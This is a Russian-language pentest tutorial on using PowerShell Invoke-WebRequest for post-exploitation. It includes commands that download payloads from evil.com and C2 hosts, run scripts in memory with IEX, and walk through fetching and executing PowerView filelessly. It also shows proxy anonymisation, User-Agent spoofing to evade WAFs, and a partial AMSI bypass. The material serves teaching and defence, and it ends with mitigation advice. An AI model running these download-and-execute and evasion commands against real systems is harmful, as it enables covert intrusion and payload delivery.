# Скачивание файлов через PowerShell Invoke-WebRequest: Архитектура, Практика и Обход Защит

## Контекст и базовые понятия

`Invoke-WebRequest` (alias `iwr`, `wget`, `curl`) — это встроенный командлет PowerShell, предназначенный для отправки HTTP и HTTPS запросов к веб-ресурсам и получения ответов. В контексте тестирования на проникновение (pentest) и пост-эксплуатации этот инструмент является критически важным компонентом арсенала атакующего для загрузки вредоносного ПО, эксплойтов, скриптов для разведки (например, PowerView, BloodHound) или инструментов для персистентности на скомпрометированный хост.

Ключевое отличие `Invoke-WebRequest` от аналогичных утилит (таких как `curl` в Linux или `wget`) заключается в том, что он возвращает не просто бинарный поток или текст, а сложный объект .NET (`Microsoft.PowerShell.Commands.WebResponseObject`). Этот объект содержит структуру ответа, включая статус-код, заголовки, куки, а также распарсенное HTML-содержимое (DOM), что позволяет проводить дальнейший парсинг данных непосредственно в памяти без временных файлов.

В среде Windows PowerShell (версии 5.1 и ниже) и PowerShell Core (7.x) поведение командлета может различаться в части обработки SSL/TLS и парсинга HTML. В Windows PowerShell по умолчанию используется устаревший `System.Net.WebRequest`, тогда как в PowerShell 7+ по умолчанию используется `System.Net.Http.HttpClient`, что обеспечивает поддержку современных протоколов (TLS 1.2/1.3) и улучшенную производительность.

Для специалиста по информационной безопасности важно разграничивать `Invoke-WebRequest` от других механизмов загрузки файлов в Windows, так как это влияет на детекцию в системах EDR/XDR.

| Характеристика | `Invoke-WebRequest` (`iwr`) | `Start-BitsTransfer` | `Certutil` | `Bitsadmin` |
| :--- | :--- | :--- | :--- | :--- |
| **Протокол** | HTTP/HTTPS | HTTP/HTTPS (BITS) | HTTP/HTTPS/FTP | HTTP/HTTPS |
| **Возвращаемый тип** | Объект `WebResponseObject` | Объект `BITSJob` | Бинарные данные (файл) | Бинарные данные (файл) |
| **Зависимости** | .NET Framework / .NET Core | Служба BITS | Встроенный компонент OS | Встроенный компонент OS |
| **Типичное использование** | Скриптовая загрузка, парсинг | Фоновая загрузка больших файлов | Проверка хэшей, обход брандмауэра | Управление фоновыми задачами |
| **Детекция в EDR** | Высокая (часто блокируется AMSI) | Средняя (мониторинг службы BITS) | Низкая (легитимный инструмент) | Низкая (устаревший инструмент) |
| **Поддержка TLS 1.3** | Да (в PS 7+) | Да | Да | Да |

`Invoke-WebRequest` часто используется в связке с другими инструментами. Например, после скачивания скрипта он может быть выполнен в памяти с помощью `IEX` (Invoke-Expression) или `IEX (New-Object Net.WebClient).DownloadString()`. Важно понимать, что `Invoke-WebRequest` не является самостоятельным вектором атаки, но выступает каналом доставки (delivery channel) для последующей эксплуатации.

## Внутреннее устройство предмета

`Invoke-WebRequest` функционирует как обертка над сетевыми API .NET. При выполнении командлет создает объект запроса, настраивает параметры соединения (таймауты, заголовки, куки, прокси), отправляет данные на сервер и получает ответ.

### Архитектура обработки запроса

Процесс обработки запроса можно разделить на несколько этапов:
1.  **Инициализация:** Создание объекта `WebRequest` или `HttpClient`.
2.  **Настройка параметров:** Применение аргументов командлета (`-Headers`, `-WebSession`, `-Method`, `-Body`).
3.  **Отправка:** Передача запроса по сети.
4.  **Получение ответа:** Чтение заголовков и тела ответа.
5.  **Парсинг:** Если ответ имеет тип `text/html`, PowerShell пытается распарсить его в DOM-объект (доступен через свойство `ParsedHtml`).
6.  **Возврат:** Формирование объекта `WebResponseObject`.

### Структура объекта ответа

Результат выполнения `Invoke-WebRequest` — это объект, содержащий следующие ключевые свойства:

```json
{
  "StatusCode": 200,
  "StatusDescription": "OK",
  "Headers": {
    "Content-Type": "application/octet-stream",
    "Content-Length": "1024",
    "Server": "Microsoft-IIS/10.0"
  },
  "RawContent": "HTTP/1.1 200 OK\r\nContent-Type: ...",
  "Content": "Binary data or string content",
  "Links": [
    {
      "InnerText": "Download",
      "Href": "http://example.com/file.exe"
    }
  ],
  "Forms": [],
  "Images": [],
  "InputFields": []
}
```

### Управление сессиями и куки

Для поддержания состояния (stateful) сессий, таких как аутентификация, используется объект `WebRequestSession`. Он инкапсулирует `CookieContainer` и позволяет передавать куки между запросами, имитируя поведение браузера.

```text
[Client] ──(1. GET /login)──▶ [Server]
   │                             │
   │◀──(2. Set-Cookie: SID=abc)│
   │                             │
   │ (3. Сохранение в CookieContainer)
   │
   │ (4. GET /protected/file) ──▶ [Server]
   │      (с куки SID=abc)
   │◀──(5. Ответ с файлом)
```

### Параметры командлета

Основные параметры, влияющие на функциональность:
*   `-Uri`: URI ресурса.
*   `-OutFile`: Путь для сохранения файла. Если указан, содержимое не парсится в DOM, а записывается в файл.
*   `-Headers`: Хеш-таблица с заголовками HTTP.
*   `-WebSession`: Объект сессии для управления куки.
*   `-Method`: HTTP-метод (GET, POST, PUT, DELETE).
*   `-Body`: Тело запроса (для POST/PUT).
*   `-UseBasicParsing`: Отключает парсинг HTML (используется в PowerShell 7+ по умолчанию, ускоряет выполнение и снижает зависимость от COM-объектов IE).

## Применение и работа с предметом

На практике использование `Invoke-WebRequest` в пост-эксплуатации требует обхода защитных механизмов, таких как AMSI (Antimalware Scan Interface), EDR-логгеры и сетевые фильтры.

### Обход AMSI и EDR

AMSI сканирует содержимое скриптов в памяти перед выполнением. `Invoke-WebRequest` сам по себе не всегда сканируется, но если результат сохраняется в переменную и анализируется, или если используется `IEX`, срабатывают триггеры. Для загрузки бинарных файлов (эксплойтов) часто используется прямая запись в файл с обходом AMSI.

### Использование прокси и анонимизация

Для маскировки источника атаки часто используются прокси-серверы или цепочки прокси (например, через Tor или SOCKS5).

```powershell
# Использование прокси для загрузки файла
Invoke-WebRequest -Uri "http://evil.com/payload.exe" `
  -OutFile "C:\Temp\payload.exe" `
  -Proxy "http://127.0.0.1:8080" `
  -ProxyUseDefaultCredentials
```

### Загрузка в память (In-Memory)

Вместо записи на диск, что оставляет артефакты, вредоносный код часто загружается в память и выполняется.

```powershell
# Загрузка скрипта в память
$script = (Invoke-WebRequest -Uri "http://c2.server.com/script.ps1").Content
IEX $script
```

### Обработка ошибок и таймаутов

При работе в нестабильных сетях или при наличии WAF (Web Application Firewall) важно настраивать таймауты и повторные попытки.

```powershell
# Настройка таймаута и отключение прогресс-бара для скорости
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "http://c2.server.com/large_payload.bin" `
  -OutFile "C:\Temp\payload.bin" `
  -TimeoutSec 30
```

### Примеры использования в разных контекстах

1.  **Загрузка эксплойта:** Прямая загрузка бинарного файла на диск.
2.  **Сбор разведданных:** Парсинг HTML-страницы для извлечения ссылок или данных.
3.  **Обход WAF:** Использование кастомных User-Agent и заголовков для имитации легитимного трафика.

```powershell
# Имитация браузера Chrome
Invoke-WebRequest -Uri "http://target.com/api/data" `
  -Headers @{
      "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
      "Accept" = "application/json"
  }
```

## Сквозной практический пример: Загрузка и выполнение PowerView

**Исходные условия:**
*   **Среда:** Windows 10, PowerShell 5.1.
*   **Роль:** Атакующий, имеющий доступ к PowerShell на скомпрометированном хосте.
*   **Цель:** Загрузить скрипт PowerView.ps1 с C2-сервера и выполнить его в памяти для сбора информации о домене.
*   **Инструменты:** PowerShell, C2-сервер с веб-сервером.

### Шаг 1: Проверка доступности C2-сервера

Перед загрузкой проверяется, доступен ли сервер.

```powershell
# Проверка доступности сервера
Invoke-WebRequest -Uri "http://192.168.1.100:8080" -TimeoutSec 5
```

**Ожидаемый вывод:**
Если сервер доступен, возвращается объект с `StatusCode: 200`. Если нет — ошибка таймаута или подключения.

### Шаг 2: Загрузка скрипта в переменную

Скрипт загружается в переменную `$script` без записи на диск.

```powershell
# Загрузка содержимого скрипта в память
$script = (Invoke-WebRequest -Uri "http://192.168.1.100:8080/PowerView.ps1").Content
```

**Ожидаемый вывод:**
Переменная `$script` содержит строковое представление PowerShell-скрипта.

### Шаг 3: Обход AMSI (опционально)

Если AMSI блокирует выполнение, может потребоваться его отключение или обход.

```powershell
# Отключение AMSI (требует прав администратора или использования уязвимостей)
# Примечание: В современных системах это может быть заблокировано EDR
$amsiInit = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "Amsi*" }
# Дальнейшие действия по обходу зависят от конкретной защиты
```

### Шаг 4: Выполнение скрипта в памяти

Скрипт выполняется с помощью `IEX`.

```powershell
# Выполнение загруженного скрипта
IEX $script
```

**Ожидаемый вывод:**
Командлеты PowerView (например, `Get-DomainUser`) становятся доступными в текущей сессии PowerShell.

### Шаг 5: Сбор информации

Использование загруженного инструмента для разведки.

```powershell
# Получение списка пользователей домена
Get-DomainUser | Select-Object Name, SamAccountName
```

**Ожидаемый вывод:**
Список пользователей домена с их атрибутами.

**Ожидаемый вывод примера:**
Демонстрирует возможность загрузки и выполнения произвольного кода в памяти без создания файлов на диске, что усложняет детекцию.

## Аналитический вывод

`Invoke-WebRequest` является мощным инструментом как для легитимного администрирования, так и для атакующих в рамках пост-эксплуатации. Его способность работать с HTTP/HTTPS, управлять сессиями и парсить HTML делает его универсальным средством для взаимодействия с веб-ресурсами. В контексте кибербезопасности важно понимать, что использование `Invoke-WebRequest` оставляет заметные следы в логах PowerShell, сетевом трафике и, возможно, в AMSI. Для защиты от подобных атак рекомендуется использовать EDR-решения, мониторить исходящие HTTP-запросы с рабочих станций, ограничивать выполнение PowerShell и использовать AppLocker/WDAC для контроля выполнения скриптов.
